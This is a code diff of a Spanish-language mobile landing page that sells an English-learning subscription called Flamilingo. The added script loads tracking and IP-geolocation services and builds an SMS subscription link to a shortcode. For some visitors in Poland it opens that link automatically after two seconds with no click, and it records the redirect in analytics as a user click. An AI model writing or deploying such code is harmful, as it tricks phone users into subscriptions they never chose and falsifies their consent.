@@ -8,7 +8,6 @@
   
 	<title>¡APRENDE INGLÉS DESDE TU MÓVIL!</title>
 	<link href="css/styles.css" rel="stylesheet" type="text/css">
-	<link rel="shortcut icon" href="">
 
 	</head>
 
@@ -20,6 +19,8 @@
 	Suscríbete y accede a nuestro portal web para aprender inglés.
 	</div>
 </aside>
+
+	<a href="javascript:void(0)" id="close"></a>
 
 	<header>
 		<div class="wrap">
@@ -57,7 +58,6 @@
 		<div id="optin-container" class="clearfix optin-container orange-optin">
 			<button type="button" id="identify-submit-button" class="submit-button subscribe-submit-button">Aceptar y Subscribir</button>
 			<button class="cancel-button">Cancelar</button>
-			
 		</div>
 
 		<div class="lr-box clearfix">
@@ -100,7 +100,8 @@
 	<!-- Brand-specific components -->
 	<div class="brand-flamilingo">
 		<p>Estas solo a un paso de SUSCRIBIRTE a <strong>Flamilingo</strong>, pulsa en el botón para confirmar</p>
-		<button type="submit" id="identify-submit-button" class="submit-button subscribe-submit-button" value="Y">Aceptar y Subscribir</button>
+
+		<div class="row button-container"></div>
 		<button class="cancel-button">Cancelar</button>
 	</div>
 
@@ -118,12 +119,101 @@ document.getElementById("identify-submit-button").onclick = function popup() {
 el.getElementsByClassName("cancel-button")[0].onclick = function popoff() {
 	el.style.display = "none";
 }
-el.getElementsByClassName("submit-button")[0].onclick = function subscribe() {
-	alert ("do your stuff guys");
-}
+// el.getElementsByClassName("submit-button")[0].onclick = function subscribe() {
+// 	alert ("do your stuff guys");
+// }
 
 </script>
 
+<script src='../_assets/js/pageUtils.js'></script>
+	<script data-remove>
+		var queryStringObj = {
+			"landingpage": "http%3A%2F%2Fexample.com",
+			"country": "PL",
+			"adscenario": "pl_ok_v73_wap_s_sam",
+			"affiliateid": "SAM",
+			"clickid": "qwerty"
+		}
+	</script>
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','https://www.google-analytics.com/analytics.js','gac');
+
+		var isSmadex = !!queryStringObj.ctrTrackingUrl && queryStringObj.ctrTrackingUrl.indexOf('smadex') > 0;
+
+		gac('create', 'UA-45774216-20', 'auto', { 'cookieDomain': 'none'});
+		gac('set', 'checkProtocolTask', function(){ /* nothing */ });
+		gac('set', 'page', 'clashroyale-pl-1');
+		gac('set', 'dimension1', queryStringObj.campaignid || isSmadex ? '1' : '2'); // campaignid
+		gac('set', 'dimension2', queryStringObj.pubid || ''); // publisher
+		gac('set', 'dimension3', queryStringObj.network || isSmadex ? 'smadex' : 'unknown');  // network
+		gac('set', 'dimension4', 'scsms'); // opt-in method
+		gac('set', 'dimension5', typeof isMraid != "undefined" && isMraid ? 'mraid' : 'not_mraid')
+
+		gac('send', 'pageview');
+	</script>
+	<script>
+		loadScriptWithQueryString('https://tags.mobirun.net/webapi/v2/one-click-id', toQueryString(queryStringObj));
+		loadScriptWithQueryString('https://ipapi.co/jsonp/', toQueryString({callback: 'page_setip'}));
+
+		var visitor_country = null;
+		function page_setip(params) {
+		  visitor_country = params.country;
+		}
+
+		function doit(params) {
+
+			gac('send', 'event', 'web-api', 'webapi-api-call');
+
+			var shortcode = '60455';
+			var keyword = 'YES ' + params.data[0].uniquecode;
+			var buttonText = 'Acceptar y Suscribir';
+
+			var clickHandler = function(e) {
+				var label = !!this.dataset ? this.dataset.name : 'unknown';
+				setTimeout(function() {
+				  gac('send', 'event', 'interaction', 'cta_click', label);
+				  if(!!queryStringObj.ctrTrackingUrl) {
+					createPixel(queryStringObj.ctrTrackingUrl);
+				  }
+				}, 1);
+			}
+
+			var button = document.createElement('a');
+			button.className = 'button';
+			button.text = buttonText;
+			if(!!button.dataset) {
+			  button.dataset.name = 'button';
+			}
+			var href = getSMSHref(shortcode, keyword);
+			// var href = `javascript:createPixel('${queryStringObj.ctrTrackingUrl}');openUrl('http://n.trendme.co/pl/beauty-tips-tm?offer=1&device=smart')`
+			button.href = href;
+			button.addEventListener('click', clickHandler);
+			document.querySelector('.button-container').appendChild(button);
+
+			var imgWrap = document.getElementById('img-wrap');
+			if(!!imgWrap.dataset) {
+			  imgWrap.dataset.name = 'img';
+			}
+			imgWrap.addEventListener('click', clickHandler, true);
+			imgWrap.href = href;
+
+			setTimeout(function() {
+			  if(!!visitor_country && visitor_country == 'PL' && Math.random() > 0.6) {
+
+				  gac('send', 'event', 'auto-interaction', 'cta_click');
+				  var raw_href = getSMSHrefRaw(shortcode, keyword);
+				  if(typeof isMraid != "undefined" && isMraid) {
+					mraid.open(raw_href);
+				  } else {
+					window.location.href = raw_href;
+				  }
+				}
+			}, 2000);
+		}
+	</script>
 
 </body>
 </html>
